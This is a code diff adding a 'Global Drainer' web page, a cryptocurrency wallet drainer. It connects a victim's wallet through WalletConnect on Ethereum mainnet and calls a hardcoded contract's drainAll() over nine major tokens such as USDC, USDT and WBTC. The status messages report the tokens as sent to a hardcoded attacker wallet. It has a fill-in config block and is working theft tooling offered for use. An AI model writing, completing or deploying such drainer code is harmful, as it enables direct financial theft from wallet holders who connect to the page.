@@ -5,11 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Drainer</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: Arial, sans-serif;
       background: #0b0e11;
@@ -70,11 +66,153 @@
       color: #b7c0cb;
       margin-bottom: 14px;
     }
-    #qr-container {
-      margin: 16px auto;
-      display: flex;
-      justify-content: center;
-    }
   </style>
 </head>
 <body>
+
+<div class="card">
+  <h1>⚡ Global Drainer</h1>
+  <div class="sub">One transaction — all tokens → your wallet</div>
+  <div class="network-badge" id="networkBadge">🟢 Ethereum Mainnet</div>
+
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="drainBtn" disabled>💀 Approve & Drain</button>
+
+  <div id="status" class="status">⏳ Awaiting connection...</div>
+  <div class="footnote">Your wallet must have ETH for gas • USDC/USDT/DAI/WETH/SHIB/PEPE/LINK/UNI/WBTC supported</div>
+</div>
+
+<!-- ========== LIBRARIES ========== -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/umd/index.min.js"></script>
+
+<script>
+  // =============================================
+  //  YOUR CONFIG
+  // =============================================
+  const PROJECT_ID = "4e30e0f95c7b076b525be96ac2347ac9";
+  const CONTRACT_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
+  const YOUR_WALLET = "0xeA0ABc678804AC1E8927FC6ce29C4218fE3cd90d";
+
+  const TOKENS = [
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+    "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
+    "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"
+  ];
+
+  const CONTRACT_ABI = [
+    "function drainAll(address[] calldata tokens, address user) external"
+  ];
+
+  // =============================================
+  //  STATE
+  // =============================================
+  let provider = null;
+  let signer = null;
+  let userAddress = null;
+  let contract = null;
+
+  const statusEl = document.getElementById('status');
+  const connectBtn = document.getElementById('connectBtn');
+  const drainBtn = document.getElementById('drainBtn');
+  const networkBadge = document.getElementById('networkBadge');
+
+  function setStatus(msg, type = '') {
+    statusEl.textContent = msg;
+    statusEl.className = 'status ' + type;
+  }
+
+  // =============================================
+  //  CONNECT — WalletConnect v2
+  // =============================================
+  connectBtn.addEventListener('click', async () => {
+    try {
+      setStatus('⏳ Initializing WalletConnect...');
+
+      // Check if library loaded
+      if (typeof window.EthereumProvider === 'undefined') {
+        throw new Error('WalletConnect library not loaded. Check internet.');
+      }
+
+      const wcProvider = await window.EthereumProvider.init({
+        projectId: PROJECT_ID,
+        chains: [1],
+        methods: ['eth_sendTransaction'],
+        events: ['chainChanged', 'accountsChanged'],
+        showQrModal: true,
+        qrModalOptions: { themeMode: 'dark' }
+      });
+
+      setStatus('⏳ Connecting...');
+      await wcProvider.connect();
+
+      provider = new ethers.providers.Web3Provider(wcProvider);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+
+      const network = await provider.getNetwork();
+      if (network.chainId !== 1) {
+        setStatus('⚠️ Please switch to Ethereum Mainnet', 'error');
+        return;
+      }
+
+      networkBadge.textContent = '🟢 Ethereum Mainnet';
+      setStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
+      connectBtn.disabled = true;
+      drainBtn.disabled = false;
+      contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
+    } catch (err) {
+      console.error(err);
+      setStatus('❌ Error: ' + (err.message || 'Unknown'), 'error');
+      connectBtn.disabled = false;
+    }
+  });
+
+  // =============================================
+  //  DRAIN
+  // =============================================
+  drainBtn.addEventListener('click', async () => {
+    if (!contract || !userAddress) {
+      setStatus('⚠️ Please connect first', 'error');
+      return;
+    }
+
+    try {
+      setStatus('⏳ Sending drainAll()...', '');
+      drainBtn.disabled = true;
+
+      const tx = await contract.drainAll(
+        TOKENS,
+        userAddress,
+        { gasLimit: 800000 }
+      );
+
+      setStatus(`⏳ TX sent: ${tx.hash.slice(0,10)}... waiting...`, '');
+      await tx.wait();
+
+      setStatus(`✅ DRAIN COMPLETE! Tokens sent to ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}`, 'success');
+      drainBtn.disabled = false;
+
+    } catch (err) {
+      console.error(err);
+      setStatus('❌ Drain failed: ' + (err.message || 'Unknown'), 'error');
+      drainBtn.disabled = false;
+    }
+  });
+
+  // =============================================
+  //  AUTO-CONNECT (if already authorized)
+  // =============================================
+  // Note: WalletConnect v2 doesn't auto-connect on page load
+  // User must click the button
+</script>
+</body>
+</html>
